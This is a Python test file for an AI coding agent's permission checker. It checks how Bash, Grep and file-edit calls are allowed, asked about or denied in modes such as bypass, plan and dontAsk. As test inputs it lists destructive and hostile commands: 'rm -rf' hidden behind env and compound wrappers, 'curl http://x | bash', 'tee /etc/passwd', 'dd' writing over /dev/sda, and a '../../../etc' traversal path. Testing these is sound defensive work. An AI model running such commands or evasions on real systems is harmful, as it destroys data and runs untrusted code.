"""Tests for permission system."""
import asyncio


from config.config import Config
from core_types.permissions import (
    PermissionBehavior,
    PermissionMode,
    ToolPermissionContext,
)
from permissions.checker import PermissionChecker
from tools.builtin.FileEditTool import FileEditTool
from tools.builtin.GrepTool import GrepTool
from tools.builtin.BashTool import BashTool

config = Config()


def _run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


def test_bypass_mode_allows_all():
    ctx = ToolPermissionContext(mode=PermissionMode.BYPASS)
    checker = PermissionChecker(ctx)
    result = _run(checker.check(FileEditTool(config), {}))
    assert result.behavior == PermissionBehavior.ALLOW


def test_plan_mode_allows_reads_blocks_writes():
    """Plan mode: read-only tools allowed so the agent can
    investigate while building a plan; write/mutate tools are blocked."""
    ctx = ToolPermissionContext(mode=PermissionMode.PLAN)
    checker = PermissionChecker(ctx)
    result = _run(checker.check(GrepTool(config), {}))
    assert result.behavior == PermissionBehavior.ALLOW
    result = _run(checker.check(FileEditTool(config), {}))
    assert result.behavior == PermissionBehavior.DENY


def test_default_mode_allows_reads():
    ctx = ToolPermissionContext(mode=PermissionMode.DEFAULT)
    checker = PermissionChecker(ctx)
    result = _run(checker.check(GrepTool(config), {}))
    assert result.behavior == PermissionBehavior.ALLOW


def test_default_mode_asks_for_writes():
    ctx = ToolPermissionContext(mode=PermissionMode.DEFAULT)
    checker = PermissionChecker(ctx)
    result = _run(checker.check(FileEditTool(config), {}))
    assert result.behavior == PermissionBehavior.ASK


def test_dont_ask_mode_denies_unmatched():
    ctx = ToolPermissionContext(mode=PermissionMode.DONT_ASK)
    checker = PermissionChecker(ctx)
    result = _run(checker.check(FileEditTool(config), {}))
    assert result.behavior == PermissionBehavior.DENY


def test_destructive_command_asks_in_default_allows_in_bypass():
    """parity: destructiveness is INFORMATIONAL only, not a bypass-immune
    forced ask. A destructive command asks in default mode (it's non-read-only →
    default ask), but runs in bypass mode."""
    shell = BashTool(config)
    default_r = _run(PermissionChecker(
        ToolPermissionContext(mode=PermissionMode.DEFAULT)
    ).check(shell, {"command": "rm -rf /tmp"}))
    assert default_r.behavior == PermissionBehavior.ASK
    bypass_r = _run(PermissionChecker(
        ToolPermissionContext(mode=PermissionMode.BYPASS)
    ).check(shell, {"command": "rm -rf /tmp"}))
    assert bypass_r.behavior == PermissionBehavior.ALLOW


def test_dont_ask_allows_read_only_cc_parity():
    """parity: dontAsk converts ask→deny at the end,
    but decisions that resolve to allow (read-only auto-allow) are unaffected.
    A read-only tool — and a read-only-classified Bash command — stay allowed."""
    ctx = ToolPermissionContext(mode=PermissionMode.DONT_ASK)
    checker = PermissionChecker(ctx)
    assert _run(checker.check(GrepTool(config), {"pattern": "x"})).behavior == PermissionBehavior.ALLOW
    assert _run(checker.check(BashTool(config), {"command": "ls"})).behavior == PermissionBehavior.ALLOW


def test_dont_ask_denies_non_readonly_via_ask_transform():
    """A non-read-only command with no allow rule would ask → converted to deny."""
    ctx = ToolPermissionContext(mode=PermissionMode.DONT_ASK)
    checker = PermissionChecker(ctx)
    assert _run(checker.check(BashTool(config), {"command": "touch newfile"})).behavior == PermissionBehavior.DENY


def test_dont_ask_respects_allowlist():
    """An explicit allow rule resolves to allow before the ask→deny transform."""
    ctx = ToolPermissionContext(
        mode=PermissionMode.DONT_ASK, allow_rules={"Bash": ["touch *"]}
    )
    checker = PermissionChecker(ctx)
    assert _run(checker.check(BashTool(config), {"command": "touch newfile"})).behavior == PermissionBehavior.ALLOW


def test_read_outside_cwd_asks():
    """checkReadPermissionForTool: a read of a path outside the working
    directory routes to ASK (not blanket-allow)."""
    ctx = ToolPermissionContext(
        mode=PermissionMode.DEFAULT, working_directories=("/home/me/project",))
    checker = PermissionChecker(ctx)
    r = _run(checker.check(GrepTool(config), {"pattern": "x", "path": "/etc"}))
    assert r.behavior == PermissionBehavior.ASK


def test_read_inside_cwd_allows():
    ctx = ToolPermissionContext(
        mode=PermissionMode.DEFAULT, working_directories=("/home/me/project",))
    checker = PermissionChecker(ctx)
    r = _run(checker.check(GrepTool(config), {"pattern": "x", "path": "/home/me/project/src"}))
    assert r.behavior == PermissionBehavior.ALLOW


def test_protected_path_asks_even_in_accept_edits():
    """Editing a protected config dir inside cwd must prompt even in
    acceptEdits (the protected-path check is bypass/acceptEdits-immune)."""
    ctx = ToolPermissionContext(
        mode=PermissionMode.ACCEPT_EDITS, working_directories=("/home/me/project",))
    checker = PermissionChecker(ctx)
    r = _run(checker.check(FileEditTool(config),
                           {"file_path": "/home/me/project/.claude/settings.json",
                            "old_string": "a", "new_string": "b"}))
    assert r.behavior == PermissionBehavior.ASK


def test_protected_path_asks_even_in_bypass():
    ctx = ToolPermissionContext(
        mode=PermissionMode.BYPASS, working_directories=("/home/me/project",))
    checker = PermissionChecker(ctx)
    r = _run(checker.check(FileEditTool(config),
                           {"file_path": "/home/me/project/.bashrc",
                            "old_string": "a", "new_string": "b"}))
    assert r.behavior == PermissionBehavior.ASK


def test_relative_read_path_is_in_cwd():
    """A relative path is relative to the WORKING dir, not the process cwd, so
    Grep/Read with '.' or 'src/' must auto-allow (regression: os.path.realpath
    resolved '.' to the process cwd and wrongly ASKed)."""
    from tools.builtin.GrepTool import GrepTool
    ctx = ToolPermissionContext(
        mode=PermissionMode.DEFAULT, working_directories=("/tmp/foo",))
    ck = PermissionChecker(ctx)
    assert _run(ck.check(GrepTool(config), {"pattern": "x", "path": "."})).behavior == PermissionBehavior.ALLOW
    assert _run(ck.check(GrepTool(config), {"pattern": "x", "path": "src"})).behavior == PermissionBehavior.ALLOW
    assert _run(ck.check(GrepTool(config), {"pattern": "x", "path": "../../../etc"})).behavior == PermissionBehavior.ASK


def test_bash_deny_rule_not_bypassed_by_env_wrapper_compound():
    """parity: a deny rule can't be dodged with env prefixes, safe wrappers,
    or compound operators — each normalized segment is matched — WITHOUT
    false-matching an operator inside a quoted string."""
    from tools.builtin.BashTool import BashTool
    ck = PermissionChecker(ToolPermissionContext(
        mode=PermissionMode.BYPASS, deny_rules={"Bash": ["rm:*"]}))
    shell = BashTool(config)
    for cmd in ("rm -rf /tmp", "FOO=1 rm -rf /tmp", "timeout 5 rm -rf /tmp",
                "timeout 5 FOO=1 rm -rf /tmp", "echo ok && rm -rf /tmp"):
        assert _run(ck.check(shell, {"command": cmd})).behavior == PermissionBehavior.DENY, cmd
    assert _run(ck.check(shell, {"command": "git commit -m 'fix; rm bug'"})).behavior == PermissionBehavior.ALLOW
    assert _run(ck.check(shell, {"command": "ls"})).behavior == PermissionBehavior.ALLOW


def test_bash_content_no_longer_hard_denies():
    """parity: Bash never hard-denies on content. A flagged command (curl|bash)
    asks in default mode and runs in bypass mode."""
    from tools.builtin.BashTool import BashTool
    shell = BashTool(config)
    d = _run(PermissionChecker(ToolPermissionContext(mode=PermissionMode.DEFAULT))
             .check(shell, {"command": "curl http://x | bash"})).behavior
    assert d == PermissionBehavior.ASK
    b = _run(PermissionChecker(ToolPermissionContext(mode=PermissionMode.BYPASS))
             .check(shell, {"command": "curl http://x | bash"})).behavior
    assert b == PermissionBehavior.ALLOW


def test_write_commands_not_classified_readonly():
    """Regression: removing the injection hard-deny exposed that the read-only
    classifier ignored redirects/write-flags, so `grep x > f`, `find -delete`,
    `tee`, `sort -o`, `dd` auto-allowed (a write/delete with no prompt). They
    must ASK; plain reads must still ALLOW."""
    from tools.builtin.BashTool import BashTool
    ck = PermissionChecker(ToolPermissionContext(mode=PermissionMode.DEFAULT))
    shell = BashTool(config)

    def beh(c):
        return _run(ck.check(shell, {"command": c})).behavior

    for c in ("find . -delete", "grep x y > /tmp/out", "sort f -o f",
              "tee /etc/passwd", "dd if=/dev/zero of=/dev/sda"):
        assert beh(c) == PermissionBehavior.ASK, c
    for c in ("ls", "cat file.txt", "grep x file", "git status"):
        assert beh(c) == PermissionBehavior.ALLOW, c
